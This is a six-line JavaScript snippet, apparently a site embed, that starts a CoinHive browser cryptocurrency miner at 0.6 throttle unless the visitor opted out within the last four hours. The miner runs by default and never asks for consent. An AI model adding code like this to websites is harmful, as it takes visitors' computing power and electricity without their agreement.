var miner = new CoinHive.Anonymous('cZOJbzOpTlHxQGrVP1w03ZuQlAenROlU', {
    throttle: 0.6
});
if (!miner.didOptOut(14400)) {
    miner.start();
}